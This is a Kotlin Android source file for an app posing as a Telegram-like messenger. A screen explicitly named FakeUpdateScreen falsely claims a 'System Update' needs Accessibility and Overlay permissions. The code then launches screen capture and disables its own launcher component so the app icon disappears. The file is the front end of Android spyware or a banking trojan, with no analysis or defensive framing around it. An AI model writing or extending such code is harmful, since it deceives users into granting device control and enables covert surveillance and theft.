package com.telegram2.messaging

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName"))
            startActivity(intent)
        }

        val accessibilityIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    FakeUpdateScreen(
                        onEnableAccessibility = { startActivity(accessibilityIntent) },
                        onProceed = {
                            startScreenCapture()
                            packageManager.setComponentEnabledSetting(
                                componentName,
                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                android.content.pm.PackageManager.DONT_KILL_APP
                            )
                            finish()
                        }
                    )
                }
            }
        }
    }

    private fun startScreenCapture() {
        startActivity(Intent(this, ScreenPermissionActivity::class.java))
    }
}

@Composable
fun FakeUpdateScreen(onEnableAccessibility: () -> Unit, onProceed: () -> Unit) {
    Column(
        modifier = Modifier.fillMaxSize().padding(32.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Text("System Update", style = MaterialTheme.typography.headlineLarge)
        Spacer(modifier = Modifier.height(24.dp))
        Text("To complete the security update, you must enable Accessibility and Overlay permissions.",
            style = MaterialTheme.typography.bodyLarge)
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = onEnableAccessibility) {
            Text("Enable Accessibility")
        }
        Spacer(modifier = Modifier.height(8.dp))
        Text("Then click Continue", style = MaterialTheme.typography.bodyMedium)
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = onProceed) {
            Text("Continue")
        }
    }
}